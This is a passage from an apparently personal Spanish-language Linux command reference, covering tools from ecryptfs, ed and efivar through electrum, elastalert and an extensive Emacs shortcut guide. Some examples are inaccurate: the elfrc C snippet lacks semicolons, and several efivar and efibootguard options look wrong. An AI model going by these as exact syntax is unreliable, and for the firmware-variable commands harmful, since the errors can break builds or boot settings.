# mount -t ecryptfs cripta /media/tumba (Montar el directorio. Pregunta contraseña [la firma de la clave en el fichero /root/.ecryptfs/sig-cache.txt]. Las demás preguntas [método de cifrado, longitud de la contraseña...] pueden dejarse con las opciones por defecto)
# umount /media/tumba (Desmontar directorio)
Nota.- Es bastante usual, montar el directorio consigo mismo:
# mount -t ecryptfs cripta cripta
2.-
Ejecutar el asistente de creación de directorio cifrado:
# ecryptfs-setup-private
# ecryptfs-umount-private (Desmontar el directorio)
# ecryptfs-mount-private (Montar el directorio)
Nota.- Para impedir que el directorio creado se monte automáticamente al inicio de sesión, borrar el archivo ~/.ecryptfs/auto-mount. Para revertir el proceso crear en el mismo directorio un archivo vacio:
$ touch ~/.ecryptfs/auto-mount
3.-
Encriptar el directorio personal [$HOME]
Salir de la cuenta de usuario y entrar en la de root.
# modprobe ecryptfs (activar el módulo del kernel)
# ecryptfs-migrate-home -u USUARIO (Encriptar la $HOME del USUARIO)
Cerrar la cuenta de administrador y, sin reiniciar, entrar en la de USUARIO
$ ecryptfs-unwrap-passphrase (Pedirá la contraseña. Como medida de precaución es preciso anotar la cadena de texto que muestre)
# ecryptfs-setup-swap (Como media de seguridad es necesario encriptar la partición de intercambio [Swap])
# ecryptfs-rewrap-passphrase .ecryptfs/sig-cache.txt (Modificar la contraseña)


ed
Editor de lineas.
Teclas de control:
	a (Añadir texto a partir de la línea indicada, o en la actual si no se indica)
	i (Inserta texto antes de línea indicada)
	c (Cambiar la línea o líneas indicadas)
	d (Borra la línea o las líneas indicadas)
	p (Visualiza la línea o el rango de líneas indicadas)
	n (Visualiza la línea o rango indicados mostrando su número)
	m3 (Mover la línea o rango de líneas a partir de la línea 3)
	t2 (Copiar la línea o rango de líneas indicado a partir de la línea 2)
	e[fic] (Carga el fichero indicado. No actúa si el fichero actual no está grabado)
	E[fic] (Carga el fichero indicado sin comprobar si el fichero actual está grabado o no)
	f[nombre] (Fija el nombre del fichero actual)
	r [fic] (Lee el fichero indicado añadiendo a partir de la línea indicada o de la última si no se indica)
	w [fic] (Graba las líneas indicadas, todas por defecto, en el fichero especificado o en el fichero actual por defecto)
	q (Sale del editor, emite un error si el fichero actual no fue grabado)
	Q (Igual que el anterior, sin comprobar si el fichero actual fue grabado)
	P (Activa /Desactiva el prompt del editor)
	H (Activa/Desactiva los mensaje explicativos de error)
	u (Deshace el último comando que puede deshacerse. Por ejemplo una inserción)
	!orden (Ejecuta la orden especificada llamando al intérprete de comandos sin salir del editor)
	+5 (Avanza 5 líneas o una por defecto desde la línea actual)
	-4 (Retrocede 4 líneas o una por defecto desde la línea actual)
	^d (Vuelve al modo orden)
	g/cosa/n (Busca "cosa" y vusualiza la linea [n])
	G/cosa/ (Se posiciona una a una en todas las líneas dónde ha encontrado "cosa" y espera una orden o "intro" para continuar)
	v/cosa/n (Busca las líneas que no contengan la expresión "cosa" y las visualiza)
	V/cosa/ (Se posiciona en cada linea donde no ha encontrado "cosa" [todas por defecto] a espera de una orden o "intro" para continuar)
	s/cosa/casa/[g] (Busca las líneas que contienen "cosa" y substituye "cosa" por "casa"


ed2k-hash
Herramienta para generar enlaces ed2k, útil para conocer los enlaces ed2k, también conocidos como enlaces eDonkey2000, de archivos que no se están compartiendo actualmente o que se desean los enlaces ed2k de todos los archivos en ciertos directorios. Estos enlaces son útiles en redes P2P [peer-to-peer] como eDonkey2000 y eMule, ya que permiten compartir y descargar archivos de manera descentralizada.
$ ed2k-hash documento.pdf (el enlace que genere se puede compartir con otros usuarios de la red)
$ find /ruta/al/directorio -type f -exec ed2k-hash {} \; (generará enlaces ed2k para todos los archivos en el directorio especificado y sus subdirectorios)
$ ed2k-hash documento.pdf > enlace_ed2k.txt (guardar el enlace ed2k generado en un archivo)


edac-utils
[Error Detection and Correction - detección y corrección de errores]. Conjunto de módulos del núcleo de Linux para monitorear y gestionar errores de hardware en sistemas Linux. Actualmente, su principal objetivo es el manejo de errores de memoria ECC [Error Correction Code - código de corrección de errores]. Sin embargo, también detecta e informa errores de paridad de bus PCI.
# dmesg | grep -i edac (comprobar si está soportado)
$ edac-util --report=simple (verificar el estado general de EDAC)
$ edac-util --report=full (mostrar información detallada sobre dispositivos EDAC)
$ edac-util -sv (ver maxima información del estado)


edid-decode
Herramienta que permite decodificar la información EDID [Extended Display Identification Data] de un monitor que es un estándar que permite a los monitores comunicar sus capacidades a una computadora tales como la resolución máxima, las frecuencias de actualización, el fabricante, el modelo y otros parámetros técnicos.
# get-edid | edid-decode (primero obtener la información EDID del monitor y luego la pasa a edid-decode, que la decodifica y muestra en un formato legible)
$ edid-decode edid.bin (si se dispone de un archivo que contiene datos EDID, se puede decodificar directamente)
$ edid-decode --list-hdmi-vics
$ edid-decode --list-rids


editorconfig
Indentador de estilos de codificación para todos los editores. Este paquete ayuda a definir y mantener estilos de codificación consistentes entre diferentes editores. El proyecto EditorConfig consta de un formato de archivo para definir estilos de codificación y una colección de complementos de editor de texto que permiten a los editores leer el formato de archivo y adherirse a los estilos definidos. Este paquete proporciona el comando editorconfig que se puede utilizar para reformatear y sangrar archivos de código mediante el archivo de configuración editorconfig.
Reglas para el archivo de configuración:
$ nano ~/.editorconfig
Con el contenido, adaptado a cada usuario:
       # Indica que este es el archivo raíz de EditorConfig
       root = true
       #
       # Aplicar configuraciones a todos los archivos
       [*]
       charset = utf-8
       indent_style = space
       end_of_line = lf
       insert_final_newline = true
       max_line_length = 80
       # eliminar cualquier espacio en blanco que preceda a los caracteres de nueva línea
       trim_trailing_whitespace = true
       #
       [*.sh]
       indent_style = space
       indent_size = 4
       #
       # Configuraciones específicas para archivos Python
       [*.py]
       indent_style = space
       indent_size = 4
       #
       # Configuraciones específicas para archivos Makefile
       [Makefile]
       indent_style = tab
       #
       # Configuraciones para archivos JavaScript en el directorio 'lib'
       [lib/**.js]
       indent_style = space
       indent_size = 2
$ editorconfig script.sh


efibootguard
Cargador de arranque basado en UEFI que incluye un mecanismo de actualización simple con un algoritmo a prueba de fallos. Permite armar un sistema de vigilancia de hardware antes de cargar un sistema operativo y previene que malware malicioso modifique el bootloader EFI durante el arranque. Incluye las herramientas bg_gen_unified_kernel [Generar una imagen de kernel unificada [UKI - Unified Kernel Image]], bg_printenv [Muestra variables del entorno EFI] y bg_setenv [Herramienta que modifica variables del entorno EFI]
# bg_gen_unified_kernel -k /boot/vmlinuz-linux -i /boot/initramfs-linux.img -o /boot/EFI/Linux/uki.efi (generar una imagen UKI [-o] con un kernel [-r] y un initramfs [-i] específicos)
# bg_gen_unified_kernel -k /boot/vmlinuz-linux -i /boot/initramfs-linux.img -c "root=/dev/sda2 ro quiet splash" -o /boot/EFI/Linux/uki.efi (incluir la línea de comandos del kernel)
# bg_printenv (visualizar las variables del entorno EFI que afectan el arranque)
# bg_printenv | grep BootOrder (filtrar una variable específica)
# bg_setenv BootOrder 0002,0001,0000 (establecer el orden de arranque UEFI especificando que la opción 0002 tiene prioridad sobre 0001 y 0000)
# bg_setenv Timeout 5 (ajusta el tiempo de espera del cargador de arranque a 5 segundos)


efibootmgr
Averiguar si se está ejecutando UEFI o BIOS. Si el sistema es compatible con UEFI generará diferentes variables. En caso de no ser compatible con UEFI se verás un mensaje que dice que las variables no son compatibles.
	# efibootmgr
	EFI variables are not supported on this system.
Tambien puede consultarse si exite en el sistema la carpeta /sys/firmware/efi, si no existe se está usando BIOS.
Nota.- efibootmgr solo funciona si se arranca el sistema en modo UEFI. Si se arranca en modo Legacy/BIOS, aunque se tenga una partición EFI [ESP-Epi System Partition], no se verán variables EFI [EFI variables are not supported]. Pero que exista no significa que el firmware o la instalación actual, esté usando UEFI, puede estar ahí “de adorno” porque la distro la creó automáticamente, o porque antes ya había otra instalación en modo UEFI.


efingerd
Demonio finger que ejecuta scripts y muestra su salida. El daemon fingerd es un protocolo simple que proporciona una interfaz para el mandato finger en varios sitios de red. El mandato finger devuelve un informe de estado sobre el sistema actual o un usuario. El daemon fingerd escucha las solicitudes TCP [Transmission Control Protocol] en el puerto 79 tal como se indica en el archivo /etc/services y en el archivo /etc/inetd.conf .
Un caso practico en el que se quiere que al hacer finger usuario@tu_servidor se ejecute un script que muestre la hora actual
# nano /usr/local/bin/mostrar_hora.sh
       #!/bin/bash
       echo "Hola, la hora actual es:"
       date
# chmod +x /usr/local/bin/mostrar_hora.sh (hacerlo ejecutable)
Y en el archivo de configuración:
# nano /etc/efingerd.conf
Añadir la linea:
       user USER run /usr/local/bin/mostrar_hora.sh
Indica que cuando se consulta al usuario "USER" con finger:
$ finger usuario@localhost
Se ejecutará el script.


efitools
Herramientas para manipular claves y firmas de arranque seguro [Secure Boot] EFI que proporcionan acceso a las claves y certificados. Incluye las herramientas cert-to-efi-hash-list, cert-to-efi-sig-list, efi-readvar, efi-updatevar, efitool-mkusb, flash-var, hash-to-efi-sig-list, sig-list-to-certs y sign-efi-sig-list
$ cert-to-efi-hash-list -g mycert.pem > mycert.hash (convierte el certificado mycert.pem en una lista de hashes EFI, genera los hashes y guarda la salida en mycert.hash)
$ cert-to-efi-sig-list -g mycert.pem mycert.esl (convierte el certificado mycert.pem en una lista de firmas EFI,  genera las firmas y guarda la salida en formato compatible con Secure Boot)
$ efi-readvar -v SecureBoot (muestra el estado de Secure Boot [habilitado o deshabilitado])
$ efi-readvar -v PK (leer la clave pública. PK es la Plataform Key, que controla las claves usadas en Secure Boot)
$ efi-updatevar -a -c mycert.pem -k PK.key KEK (añade la clave al KEK, especifica el certificado y firma la actualización con la clave de la plataforma)


efivar
Herramientas para gestionar variables UEFI. Puede leer y escribir variables de firmware en sistemas UEFI y almacenarlas en el firmware del sistema para ser utilizadas por el BIOS o UEFI para configurar el equipo durante el arranque.
# efivar -n SecureBoot (leer el valor de una variable específica)
# efivar --list (listar todas las variables disponibles)
# efivar -s -w SecureBoot=0 (modificar variable. Establece el valor de SecureBoot a 0)
# efivar -d SecureBoot (eliminar una variable)
# efivar -e /sys/firmware/efi/vars/SecureBoot (verificar si un archivo existe)
# efivar -i SecureBoot (obtener información sobre una variable:)
# efivar --list-names (listar viables por nombre y valor)
Nota.- El uso incorrecto de estas herramientas puede afectar la configuración del firmware y causar problemas de arranque.


eflite
Servidor de voz diseñado para integrarse con herramientas como Emacspeak y otros lectores de pantalla. Su función principal es permitir la interacción con Festival Lite, una versión ligera del sistema de síntesis de voz Festival, desarrollado en el Centro de Voz de la CMU [Carnegie Mellon University]. Esto es especialmente útil para usuarios con discapacidades visuales que dependen de lectores de pantalla para interactuar con sus sistemas. Solo ofrece soporte para el idioma inglés.
$ eflite (iniciará el servidor y lo dejará listo para recibir solicitudes de síntesis de voz)
Si en el archivo de configuración de Emacs [~/.emacs o ~/.emacs.d/init.el] se añade la linea:
      (setq emacspeak-speak-program "eflite")
Hará que Emacspeak que use eflite como su servidor de voz.
$ echo "Hola, esto es una prueba" | eflite (enviar un texto a eflite, que lo procesará y lo enviará a Festival Lite para su reproducción)


egctl
Programa para controlar el estado de las regletas programables EnerGenie contra sobretensiones con interfaz LAN. Utiliza el protocolo de intercambio de datos nativo EG-PMS-LAN versión 2.0 o 2.1, en lugar de HTTP. Actualmente, se admiten los siguientes dispositivos: EG-PMS-LAN, EG-PM2-LAN, EG-PMS2-LAN y EG-PMS-WLAN
Un archivo de configuración para dos dispositivos EG-PMS-LAN podría ser:
$ nano ~/.egtab
Con las lineas:
      eg1 pms20 192.168.0.10  5000 password
      eg2 pms20 192.168.10.10 5001 password2
Indica nombre del dispositivo, protocolo [pms20 o pms21], dirección IP del dispositivo en la red, puerto de comunicación y contraseña para acceder al dispositivo.
$ egctl eg1 (consultar el estado actual del dispositivo eg1)
$ egctl eg1 on left left off (cambiar el estado del dispositivo de corriente eg1: encender la primera toma, mantener el estado de la segunda y tercera, y apagar la cuarta del dispositivo eg1)
Nota.- valores posibles son: on [encender], off [apagar], toggle [cambiar al estado opuesto] y left [mantener el estado actual]


eggdrop
Bot de IRC escrito en C, que se instala en los canales y toma medidas de protección, como evitar que lo tomen, reconocer a los usuarios baneados para rechazarlos, reconocer a los usuarios privilegiados para darles el estado de operador, castigar a los usuarios por cosas como inundaciones de servicio... Un archivo de configuración de muestra en https://github.com/eggheads/eggdrop/blob/develop/eggdrop.conf.
$ eggdrop -m ~/.eggdrop (especificando el archivo de configuración)
$ eggdrop -n (envía todas las entradas de registro a la consola)
$ eggdrop -nt (usar terminal para simular chat DCC [Direct Client-to-Client])
$ eggdrop -nc (estadísticas del canal cada 10 segundos)


egrep
[extended grep]. Busca expresiones regulares.
	$ egrep -v '^$|^#' archivo (suprimir lineas en blanco y comentadas)
	$ egrep -c '^#' /etc/fstab (Muestra el número de lineas comentadas)
$ egrep -in "palabra" *.txt (busca “palabra” en todos los .txt del directorio)
$ egrep 'UUID|proc' /etc/fstab (Muestra las lineas con las coincidencias)
$ egrep --color '(vmx|svm)' /proc/cpuinfo (Averiguar si el equipo  admite la virtualización por hardware. Si el comando no devuelve nada es porque no lo soporta)
Otras opciones:
	-h 	Muestra las líneas coincidentes pero no los nombres de archivo.
	-i 	Ignora los cambios mayúsculas y minúsculas.
	-n 	Muestra la línea y el número de línea.
	-r 	Lee en todos los archivos de los directorios y subdirectorios.
	-v 	Muestra todas las lineas que no coinciden.
	-w      Sólo coincidencia en palabras completas.


eject
Abre/cierra la bandeja del cdrom
$ eject /dev/cdrom0    (Abre)
$ eject -t /dev/cdrom0   (Cierra)
$ eject /dev/cdrom; sleep 1; eject -t /dev/cdrom  (abrirlo y cerrarlo)
$ eject sda8 (desmonta la partición mencionada)


elastalert
Alertas fáciles y flexibles con Elasticsearch. Este paquete contiene un marco simple para alertar sobre anomalías, picos u otros patrones de interés a partir de los datos en Elasticsearch. Incluye las herramientas elastalert, elastalert-create-index, elastalert-rule-from-kibana y elastalert-test-rule
$ elastalert --config config.yaml --verbose (mostrará información detallada sobre las alertas generadas a partir de la configuración en config.yaml)
$ elastalert-create-index --config config.yaml (crea un índice en Elasticsearch para almacenar el estado de elastalert)
$ elastalert-create-index --config config.yaml (creará un índice con el prefijo elastalert_status en Elasticsearch)
$ elastalert-create-index --config config.yaml --index elastalert_custom (especificar un prefijo diferente)
$ elastalert-rule-from-kibana --config /ruta/a/config.yaml (convierte consultas de Kibana en reglas de elastalert)
$ elastalert-rule-from-kibana --config config.yaml --rule new_rule.yaml (convertir una consulta guardada en Kibana en una regla de elastalert)
$ elastalert-test-rule --config config.yaml rule.yaml (permite probar una regla simulando la ejecución de la regla y mostrará los resultados sin enviar alertas reales)
1.-
Como ejemplo, supongamos que queremos generar una alerta si detectamos más de 5 errores HTTP 500 en los últimos 10 minutos
      $ nano http_errors.yaml
      name: "Alerta de errores HTTP 500"
      type: frequency
      index: logstash-*
      num_events: 5
      timeframe:
      minutes: 10
      filter:
      - term:
      response_code: 500
      alert:
      - email
      email:
      - "admin@example.com"
Luego, lo probamos con:
$ elastalert-test-rule --config config.yaml http_errors.yaml
Y lo ejecutamos en producción
$ elastalert --config config.yaml


elasticsearch-curator
Herramienta para administrar índices de series temporales de Elasticsearch. lo que incluye eliminar, cerrar, optimizar o hacer snapshots de índices antiguos. Con elastalert [ver] en un entorno con grandes volúmenes de datos, se podria necesitar elasticsearch-curator para limpiar o gestionar los índices y evitar problemas de rendimiento. Incluye las herramientas: curator, curator_cli y es_repo_mgr
$ curator --config curator.yml delete_indices --filter_list '[{"filtertype":"age", "source":"name", "direction":"older", "unit":"days", "unit_count":30}]' (eliminar índices de más de 30 días)
$ curator_cli show_indices (listar los índices en Elasticsearch)
$ curator_cli delete_indices --filter_list '[{"filtertype":"age", "source":"name", "direction":"older", "unit":"days", "unit_count":7}]' (eliminar índices de más de 7 días)
$ es_repo_mgr create fs --name backup_repo --location /var/backups/elasticsearch (crear un nuevo repositorio de snapshots)
$ es_repo_mgr show (listar los repositorios existentes)


electricsheep
salva pantallas (screen saver) de arte abstracto en el que colaboran miles de personas en el mundo. Cuando los equipos "sueñan" ElectricSheep se enciende y comunica su ordenar con los demás a través de Internet para crear animaciones abstractas conocidas como "ovejas". Para que salga como opción en xscreensaver:
$ nano .xscreensaver
Añadir la linea al final del apartado:
	....
	- GL:                           companioncube -root                         \n\
	- GL:                           hilbert -root                               \n\
	- GL:                           tronbit -root                               \n\
	                                unicode -root                               \n\
                                	electricsheep                               \n\
Nota.- Los videos se encuentran en ~/.electricsheep en formato .avi


electrum
Cliente Bitcoin que permite a los usuarios gestionar sus bitcoins de manera segura y eficiente y protege de perder bitcoins en un error de copia de seguridad o falla de la computadora. Además, Electrum no requiere tiempo de espera porque no descarga la cadena de bloques de Bitcoin.
$ electrum create (guiará a través del proceso de creación de una nueva cartera, incluyendo la generación de una semilla de 12 palabras)
$ electrum restore (restaurar una cartera. Pedirá ingresar la semilla)
$ electrum getbalance (mostrará el saldo total de bitcoins en la cartera)
$ electrum payto 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa 0.01 (creará una transacción para enviar 0.01 BTC a la dirección especificada)
$ electrum listaddresses ()mostrará una lista de todas las direcciones generadas por la cartera)
$ electrum getprivatekeys 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa (exportar las claves privadas)
$ electrum daemon start (iniciará el daemon de Electrum y cargará tu cartera para sincronizarla)
$ electrum daemon load_wallet


elfrc
elfrc es un programa que puede convertir archivos arbitrarios como imágenes, textos, datos binarios, etc en archivos de objetos ELF [Executable and Linkable Format] que luego se pueden vincular directamente al programa y acceder a ellos mediante nombres de símbolos simples definidos por el usuario. Esto es útil cuando se desea incrustar recursos directamente en un ejecutable, en lugar de tener que cargarlos desde archivos externos en tiempo de ejecución.
$ elfrc -o logo.o -s my_logo_data logo.png (nombre del archivo objeto de salida, define un símbolo llamado my_logo_data que se usará para acceder a los datos de la imagen en el código y archivo de entrada que se desea convertir)
Nota.- elfrc no interpreta el contenido del archivo, solo lo incrusta como datos binarios. Es responsabilidad del programador saber cómo interpretar estos datos, por ejemplo, como imagen PNG, archivo de texto, etc.
1.-
Ejemplo con un archivo config.txt que se desea incrustar en un programa.
$ elfrc -o config.o -s my_config_data config.txt (convertir el archivo a objeto ELF)
Escribir el código en C:
         #include <stdio.h>
         extern char my_config_data[]
         extern int my_config_data_size
         int main() {
                 printf("Configuración:\n%s\n", my_config_data);
                 printf("Tamaño del archivo de configuración: %d bytes\n", my_config_data_size);
                 return 0;
                 }
Compilar y enlazar el programa:
$ gcc -o config_program config_program.c config.o
Ejecutar el programa:
$ ./config_program
El programa imprimirá el contenido del archivo config.txt y su tamaño.


elinks
Navegador.
$ elinks -dump fichero.html > fichero.txt  (Convierte un .html a .txt)
Atajos:
	Esc (Ver/esconder los menús. Tambien F9)
	t (nueva pestaña)
	g (Entrar nueva url)
	< > (moverse entre pestañas a derecha o izquierda)
	Flechas del cursor derecha/izquierda (pagina anterior/posterior)


elogind
Daemon que se encarga de gestionar sesiones, usuarios y "asientos" [seats: abstracciones de los dispositivos físicos donde un usuario puede interactuar con el sistema como un teclado, pantalla, etc] en un sistema Linux. Originalmente, esta funcionalidad formaba parte de systemd-logind, un componente del sistema de inicio systemd. Sin embargo, elogind se extrajo como un paquete independiente para permitir que sistemas que no utilizan systemd como sistema de inicio, por ejemplo, aquellos que usan sysvinit u otros, puedan seguir aprovechando estas capacidades de gestión de sesiones.
# systemctl enable elogind (activo al iniciar el sistema)
Aunque elogind es el daemon en sí, la interacción con él se realiza principalmente a través del comando loginctl, que permite inspeccionar y controlar sesiones, usuarios y asientos.
# loginctl list-sessions (ver las sesiones actuales en el sistema con su ID, el usuario asociado, el "asiento" y el terminal [TTY] en uso)
# loginctl show-session 1 (detallar una sesión específica, por ejemplo con ID 1)
# loginctl list-users (ver qué usuarios están actualmente logueados)
# loginctl terminate-session 1 (cerrar una sesión específica)
# loginctl lock-sessions (bloquear todas las sesiones activas)


emacs
Tutorial completo en español: <http://www.nongnu.org/emacs-man-es/> . Mucho más que un editor [no un procesador]. Lo que sigue es un pequeño manual de primeros auxilios.
Cuando Emacs abre un archivo lo abre en un buffer. Cuando leemos un fichero, lo que hacemos es copiar su contenido a una zona de memoria [a un buffer] y durante la edición lo que modificamos es esa zona de memoria, el fichero como tal permanece inalterado hasta que explícitamente demos la orden de grabar en el disco las modificaciones. Cuando emacs se inicia se abren dos búffers que no están asociados a ningún fichero: *scratch* y *messages* [En ambos el nombre empieza y acaba por un asterisco, lo que indica que no es un búffer asociado a un fichero]
$ emacs -q (Arrancar emacs prescindiendo del archivo de configuracion)
$ emacs --daemon (Iniciar emacs como demonio y a continuacion con emacsclient conectar con el servidor)
$ emacsclient -c (Conectar con el servidor)
Significado de algunas teclas en la terminologia de emacs:
	Alt = M (meta)
	Crtl= C (control)
	spc (Barra espacio)
	RET (intro)
	RETRO (retroceso)
$ emacs -nw (Lanzar emacs en consola. Para crear un alias: alias emacs='emacs -nw')
$ emacs -nw --debug-ini (Modo debuger para comprobar errores de sintaxis en ~/.emacs)
$ emacs -u usuario (Arrancar emacs con la configuración de otro usuario)
$ emacs -Q -q -nw -f eshell (Iniciar eshell en una nueva sesión de Emacs en la terminal sin cargar init.el)
Teclas de socorro:
	C-g (Cancelar algo: un comando, una combinación de teclas...)
	C-x u (Deshacer)
	M-x revert-buffer (Deshacer todo desde la última vez que se guardó)
	M-x recover-session (Recuperar archivos perdidos por un fallo del sistema)
Movimiento por el texto:
	C-a (ir al comienzo de una línea)
	C-e (ir al final de una línea)
	C-f (un caracter hacia adelante)
	C-b (un caracter hacia atrás)
	M-f (una palabra hacia adelante)
	M-b (una palabra hacia atrás)
	C-n (ir ala siguiente línea)
	C-p (ir a la línea anterior)
	M-a (Ir al inicio de la frase)
	M-e (Ir al final de la frase)
	C-v (Pagina siguiente)
	M 8 C-v (baja 8 lineas la pantalla, NO 8 PÁGINAS)
	M-v (Pagina anterior)
	M 8 M-v (Sube 8 lineas la pantalla, NO 8 PÁGINAS)
	M-< (Ir al principio del texto)
	M-> (Ir al final del texto)
	M-g g (Ir a la linea)
	C-l (Redibuja la pantalla. La primera vez que se pulsa, coloca la linea del cursor en el centro, la segunda arriba y la tercera abajo)
Salir:
	C-x C-c (Salir de Emacs)
	C-x C-s (Guardar sin salir)
	C-x C-w (Salir y guardar como)
	C-x s (Guardar todos los ficheros abiertos. Preguntará.)
Copiar, cortar, pegar y reemplazar
	C-Esp (Inicio del marcado de texto)
	C-x h (Marcar todo el buffer, "Seleccionar todo")
	M-w (Copiar)
	C-w (Cortar)
	C-y (Pegar)
	C-x C-t (Copiar linea)
	M-h (Selecciona un párrafo)
	M-% (Primero entrar la palabra a cambiar i despues la que sustituye)
Buscar:
	C-s (busca hacia adelante)
	C-r (busca hacia atras)
	C-s C-s (repite la busqueda)
Borrar:
	M-d (Palabra despues del cursor)
	M 3 M-d (Borra 3 palabras)
	C-k (del cursor a fin de linea)
	M 3 C-k (Borra 3 lineas)
	M-k (todo el párrafo)
	M 3 M-k (Borra 3 párrafos)
	M-x kill-whole-line (Borrar la linea con independencia del lugar del cursor)
Ventanas:
	C-x 2 (división horizontal de la ventana en dos)
	C-x 3 (división vertical de la ventana en dos)
	C-x 1 (Deja solo la ventana activa abierta)
	C-x o (cambiar de ventana)
	C-x 0 (Eliminar ventana actual)
	C-x } (alarga la ventana activa en dirección horizontal)
	C-x { (La acorta en dirección horizontal)
	C-x ^ (La alarga en dirección vertical)
Buffers:
	C-x k (cierra la buffer actual. Pide confirmación)
	C-x b (Cambiar de buffer)
	C-x C-b (Listar buffers en un panel)
	C-x flechas derecha/izquierda (cambiar al siguiente/anterior)
Marcas:
	C-x r m (Solicita nombre para la linea marcada)
	C-x r b a (Ir a la linea marcada con el nombre que entremos, en este caso la "a". Si se encuentra la marca en un archivo no abierto, se abrirá)
	C-x r l (Lista todas las marcas)
	M-x bookmark-delete (Eliminar una marca que entremos)
	C-spc C-spc (marca el punto del cursor en el texto)
	C-u C-spc (Va a la marca realizada con C-spc C-spc)
	C-x C-spc (Va a la penultima marca realizada con C-spc C-spc)
Imprimir:
	C-u M-x ps-print-buffer-with-faces (Imprimir a ps. Luego con ps2pdf pasar a pdf)
	M-x  print-buffer (Imprimir archivo con numeración y cabeceras)
	M-x  lpr-buffer (Imprimir sin numeración ni cabeceras)
	M-x  print-region (Imprimir trozo seleccionado con numeración y cabeceras)
	M-x  lpr-region  (Imprimir trozo seleccionado sin numeración ni cabeceras)
Varios:
	C-x C-f (brir un archivo)
	C-o (Inserta linea en blanco a continuación del cursor)
	M-x tetris (Listado de juegos en /usr/share/emacs/24.3/lisp/play/. Lanzar sin la extensión)
	M-x help-with-tutorial-spec-language (abre buffer con los idiomas disponibles para el manual)
	C-x d (Abre un directorio que se especifique)
	C-x RET f (Entrar codificación de caracteres: iso-8859-1, utf-8..)
	C-x custom (Personalizar numerosos aspectos de emacs)
	C-x C-+ (Agrandar la fuente)
	C-x C-- (Disminuir la fuente)
	C-x z z z (Repite el último comando tantas veces como "zetas" pongamos. En este caso 3 veces )
	& (Teniendo el cursor sobre un archivo en dired, permitirá entrar una aplicación para abrirla)
	C-x C-o (Sólo deja una linea en blanco)
Entrar comandos de shell e insertar:
	C-z (Suspende la sesion emacs y entra en la shell. Volver a emacs con fg o con %emacs)
	M-! (Muestra en el mini buffer un mensaje para entrar un comando y lo abre un una ventana)
	C-u M-! (Inserta la salida del comando en la posición del cursor)
	C-x i (Insertar archivo en la posición del cursor)
	C-c C-l (Mostrar historial de comandos)
	C-u M-x eshell (Lanzar otra eshell cuando ya existe una)
ayuda:
	F10 (Abre la ayuda general)
	C-h k (Muestra información sobre un atajo)
	C-h a (Todas las opciones de un comando)
	C-h b (Ver todos los atajos)
	C-h w (Muestra el atajo de la función que entremos)
	C-h f (Información sobre una función)
	C-h C RET (Muestra información sobre las codificaciones)
	C-h v (Muestra información sobre variables)
	C-h C-h (Muestra ayuda de la ayuda)
    C-h e (Muestra los mensajes de log)
    C-h v package-activated-list (Muestra las extensiones instaladas si lo han sido por "package")
Modo comando:
	M-x recover file (levantar respaldo del archivo)
	M-x apropos INTRO print (Muestra información de "print")
	M-x list-faces-display (Ver lista y muestra de los estilos disponibles)
		M-x w3m-browser-url (Pedirá url para conectar. Precisa w3m-el)
	M-x browse-url-firefox (Abrir una url con firefox)
	M-x global-linum-mode (Mostras/esconder números de linea)
	M-x global-visual-line-mode (Cortar/no cortar palabras al final de la pantalla)
	M-x global-hl-line-mode (Resaltar la linea donde está el cursor)
	M-x calendar (Mostrar mes actual, el anterior y el posterior)
	M-x command-history  (History de comandos entrados)
	M-x calculator (Calculadora muy elemental)
	M-x man (mostrar man de un comando)
	M-x woman (mostrar man de un comando)
	M-x set-buffer-file-coding-system (Entrar codificación para el presente bufer)
	M-x global-whitespace-mode (Mostrar/ocultar caracteres no imprimibles)
	M-x follow-mode (al dividir un buffer en dos pantallas [C-x 3] y activar este modo menor, hace que los paneles sean uno continuación del otro)
	M-x man-follow (Con el cursor sobre un comando linux, muestra la página de manual)
	M-x font-lock-mode (activa/desactiva coloreado de sintasxis. Por defecto activado.)
	M-x append-to-buffer (sobre una sección seleccionada, la manda a otro buffer)
	M-x proced-toggle-auto-update (Visualizar procesos del sistema [como top])
Para hacer permanente cualquiera de las opciones anteriores, colocarla en ~/.emacs de la siguiente forma:
   	(global-set-key (kbd "<f7>") 'global-linum-mode)
Para mostrar u ocultar los numeros de linea pulsando F7
1.-
Abrir navegador de archivos. Precisa tenerlo instalado
Instalar nav:
Descarga de <http://code.google.com/p/emacs-nav/>. Una vez descomprimido copiar el directorio en ~/.emacs.d/ y renombrar como nav
$ emacs .emacs
Completar configuración y que se abra pulsado F8, añadir las siguientes lineas:
	(add-to-list 'load-path "/home/USER/.emacs.d/nav/")
    (require 'nav)
    (nav-disable-overeager-window-splitting)
    (global-set-key [f8] 'nav-toggle)
Abrir con M-x nav
2.-
Añadir una "lista negra" de bufferes a los que no interesar acceder (scratch, messages...).
Añadir a .emacs las siguientes lineas:
	(require 'iswitchb)
	(iswitchb-mode)
	(add-to-list 'iswitchb-buffer-ignore "^ ")
	(add-to-list 'iswitchb-buffer-ignore "*Messages*")
	(add-to-list 'iswitchb-buffer-ignore "*ECB")
	(add-to-list 'iswitchb-buffer-ignore "*Buffer")
	(add-to-list 'iswitchb-buffer-ignore "*Completions")
	(add-to-list 'iswitchb-buffer-ignore "*scratch*")
	(add-to-list 'iswitchb-buffer-ignore "*ftp ")
	(add-to-list 'iswitchb-buffer-ignore "*bsh")
	(add-to-list 'iswitchb-buffer-ignore "*jde-log")
	(add-to-list 'iswitchb-buffer-ignore "^[tT][aA][gG][sS]$")
Al pulsar C-x b (Listar buffers abiertos) El buffer que aparece en primer lugar, resaltado en otro color, es el que se mostrará al pulsar Enter. Si queremos cambiar a otro buffer pulsar C-s para rotar el orden de los elementos de la lista.
Nota.- A partir de la versión emacs-24.4 iswitchb ha sido substituido por ido. Las lineas a añadir a .emacs son:
	(require 'ido)
	(ido-mode 'buffers) ;; only use this line to turn off ido for file names!
	(setq ido-ignore-buffers '("^ " "*Completions*" "*Shell Command Output*"
	                           "*Messages*" "Async Shell Command" "*scratch*"
	                           "*tramp*"))
3.-
Escuchar música con emms.
Instalar emms en el sistema mediante repositorio y descargar <http://ftp.gnu.org/gnu/emms/> , descomprimir y mover el directorio a ~/.emacs.d/. En .emacs colocar las lineas:
	(add-to-list 'load-path "~/.emacs.d/emms-4.0/")
	(require 'emms-setup)
	(emms-standard)
	(emms-default-players)
Llamar com M-x emms (Pulsando TAB apareceran las opciones). Salir con M-x emms-stop
4.-
Corrector ortográfico. apt-get install aspell-es dictionary-el aspell-ca
Emacs coge automaticamente el idioma por defecto del sistema. Para modificar el idiome:
	M-x ispell-change-dictionary
Corregir un texto:
	M-x ispell
Opciones en este modo:
